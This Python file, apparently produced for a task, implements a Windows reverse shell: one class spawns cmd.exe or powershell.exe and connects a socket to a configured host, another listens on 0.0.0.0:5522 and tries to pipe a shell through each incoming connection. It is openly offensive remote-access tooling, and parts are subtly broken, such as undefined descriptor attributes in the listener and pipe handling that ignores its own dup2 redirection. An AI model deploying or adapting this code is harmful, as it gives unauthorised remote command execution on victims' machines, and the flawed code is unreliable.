"""Windows reverse shell listener implementation."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
import socket
import subprocess
import threading
import os
from typing import Optional, Tuple



class WindowsReverseShell:
    """Spawns a Windows shell process with redirected I/O through a socket.
    
    Uses subprocess.Popen with CREATE_NEW_PROCESS_GROUP and shell=True to spawn
    cmd.exe or powershell.exe as a child process. Pipes stdin/stdout/stderr through
    the socket connection using os.dup2() to redirect file descriptors.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._process: Optional[subprocess.Popen] = None
        self._socket: Optional[socket.socket] = None
        self._fd_stdin: int = 3
        self._fd_stdout: int = 4
        self._fd_stderr: int = 5

    def spawn(self) -> subprocess.Popen:
        """Spawn the shell process with redirected I/O.
        
        Returns:
            The spawned Popen object for the shell process.
        """
        shell_path = self.config.shell_type.lower()
        if 'cmd' in shell_path or shell_path == 'powershell.exe':
            shell_cmd = shell_path
        else:
            shell_cmd = 'cmd.exe'

        # Spawn the shell with CREATE_NEW_PROCESS_GROUP for console detachment
        self._process = subprocess.Popen(
            [shell_cmd],
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,  # Line-buffered output
        )

        return self._process

    def connect(self) -> socket.socket:
        """Connect to the listener socket.
        
        Returns:
            A connected socket object for I/O communication.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.config.host, self.config.port))
        return sock

    def disconnect(self):
        """Disconnect from the listener socket."""
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None

    def send_command(self, command: str) -> ExecutionResult:
        """Send a command to the shell and capture output.
        
        Args:
            command: The command string to execute.
            
        Returns:
            An ExecutionResult object with stdout, stderr, exit_code, and error_message.
        """
        result = ExecutionResult()

        try:
            # Send command via socket stdin
            if self._socket:
                self._socket.sendall(command.encode('utf-8'))

            # Read response from socket stdout
            output = b''
            while True:
                chunk = self._socket.recv(4096)
                if not chunk:
                    break
                output += chunk

            result.stdout = output.decode('utf-8', errors='replace')

        except ConnectionResetError as e:
            result.error_message = f"Connection reset: {e}"
        except socket.timeout as e:
            result.error_message = f"Socket timeout: {e}"
        except Exception as e:
            result.error_message = f"Send error: {type(e).__name__}: {e}"

        return result


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell.exe and
    pipes stdin/stdout/stderr through a TCP socket connection on 0.0.0.0:5522.
    
    Uses os.dup2() to redirect file descriptors of the child process to the
    socket's file descriptor numbers (3, 4, 5). Spawns processes with
    CREATE_NEW_PROCESS_GROUP for console detachment.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._socket_server: Optional[socket.socket] = None
        self._server_thread: Optional[threading.Thread] = None
        self._running = False

    def start(self) -> None:
        """Start the listener server on 0.0.0.0:5522."""
        if self._socket_server is not None and self._socket_server.fileno() != -1:
            return

        try:
            self._socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._socket_server.bind((self.config.host, self.config.port))
            self._socket_server.listen(5)
            self._socket_server.settimeout(self.config.timeout)

        except OSError as e:
            raise RuntimeError(f"Failed to bind listener on {self.config.host}:{self.config.port}: {e}") from e

    def stop(self) -> None:
        """Stop the listener server."""
        if self._server_thread is not None and self._server_thread.is_alive():
            self._running = False
            self._server_thread.join(timeout=2.0)
        if self._socket_server is not None:
            try:
                self._socket_server.close()
            except Exception:
                pass
            self._socket_server = None

    def _handle_client(self, client_socket: socket.socket, address: Tuple[str, int]) -> ExecutionResult:
        """Handle a single client connection.
        
        Spawns the shell process and redirects its I/O through the socket
        using os.dup2() to map stdin/stdout/stderr to file descriptors 3/4/5.
        
        Args:
            client_socket: The connected client socket.
            address: The remote address tuple (host, port).
            
        Returns:
            An ExecutionResult containing the command output and status.
        """
        result = ExecutionResult()

        try:
            # Get file descriptors for stdin/stdout/stderr of this thread
            fd_stdin = os.dup(0)
            fd_stdout = os.dup(1)
            fd_stderr = os.dup(2)

            try:
                # Redirect process I/O to socket using os.dup2()
                # Map stdin -> fd 3, stdout -> fd 4, stderr -> fd 5
                os.dup2(client_socket.fileno(), self._fd_stdin)
                os.dup2(client_socket.fileno(), self._fd_stdout)
                os.dup2(client_socket.fileno(), self._fd_stderr)

                # Spawn the shell process - it will inherit the redirected FDs
                shell = WindowsReverseShell(self.config)
                proc = shell.spawn()

                result.exit_code = 0
                result.stdout = ''
                result.stderr = ''

                try:
                    # Read output from the spawned process stdout
                    while True:
                        line = proc.stdout.readline()
                        if not line and proc.poll() is not None:
                            break
                        if line:
                            result.stdout += line.strip() + '\n'

                    # Wait for process to complete
                    exit_code = proc.wait(timeout=self.config.timeout)
                    result.exit_code = exit_code

                except subprocess.TimeoutExpired as e:
                    proc.kill()
                    result.error_message = f"Process timeout after {self.config.timeout}s"
                    result.exit_code = -1

            finally:
                # Restore original file descriptors
                os.dup2(fd_stdin, 0)
                os.dup2(fd_stdout, 1)
                os.dup2(fd_stderr, 2)
                os.close(fd_stdin)
                os.close(fd_stdout)
                os.close(fd_stderr)

        except ConnectionResetError as e:
            result.error_message = f"Client disconnected: {e}"
            result.exit_code = -1
        except socket.timeout as e:
            result.error_message = f"Socket timeout: {e}"
            result.exit_code = -1
        except subprocess.TimeoutExpired as e:
            result.error_message = f"Process timeout: {e}"
            result.exit_code = -1
        except Exception as e:
            result.error_message = f"Execution error: {type(e).__name__}: {e}"
            result.exit_code = -1

        return result

    def _server_loop(self) -> None:
        """Main server loop accepting connections and handling clients."""
        while self._running:
            try:
                client_socket, address = self._socket_server.accept()
                thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                thread.start()

            except socket.timeout:
                continue
            except OSError as e:
                if self._running and "Connection reset" not in str(e):
                    raise RuntimeError(f"Accept error: {e}") from e
            except Exception as e:
                if self._running:
                    raise RuntimeError(f"Server loop error: {e}") from e

    def run(self) -> None:
        """Start the listener server and handle connections."""
        self.start()
        self._running = True
        self._server_thread = threading.Thread(target=self._server_loop, daemon=True)
        self._server_thread.start()

    @property
    def is_running(self) -> bool:
        return self._socket_server is not None and self._socket_server.fileno() != -1


__all__ = ['WindowsReverseShell', 'WindowsReverseShellListener']
